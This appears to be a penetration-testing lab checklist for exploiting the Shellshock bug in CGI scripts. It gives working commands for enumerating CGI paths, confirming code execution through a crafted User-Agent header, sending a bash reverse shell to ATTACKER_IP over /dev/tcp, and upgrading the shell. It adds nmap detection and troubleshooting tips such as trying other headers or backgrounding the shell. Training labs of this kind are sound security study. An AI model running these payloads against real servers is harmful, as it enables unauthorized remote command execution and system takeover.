# CGI / Shellshock Labs

> Cross-reference: [[cgi-shellshock-methodology]]

---

## Lab 1: Shellshock → Reverse Shell

### Steps

- [ ] Enumerate CGI scripts:
```bash
gobuster dir -u http://TARGET/cgi-bin/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/CGIs.txt \
  -x .sh,.cgi,.pl
```
- [ ] Confirm vulnerability:
```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /usr/bin/id' \
  "http://TARGET/cgi-bin/access.cgi"
```
- [ ] Expected output: `uid=33(www-data)...`
- [ ] Start listener: `nc -nlvp 4443`
- [ ] Send reverse shell:
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4443 0>&1' \
  "http://TARGET/cgi-bin/access.cgi"
```
- [ ] Catch shell → upgrade TTY:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- [ ] Read flag / enumerate for privesc

---

## Lab 2: Nmap Shellshock Detection

- [ ] Use nmap script:
```bash
nmap -sV -p 80 --script=http-shellshock \
  --script-args uri=/cgi-bin/access.cgi TARGET
```
- [ ] Confirm `VULNERABLE` in output
- [ ] Proceed with manual exploitation

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| No output from curl | Add `echo ;` before command to flush output |
| Reverse shell doesn't connect | Try different header (Referer, Cookie) |
| Connection resets | Use Python/Perl reverse shell instead of Bash |
| Shell dies immediately | Use `nohup` or background the shell process |
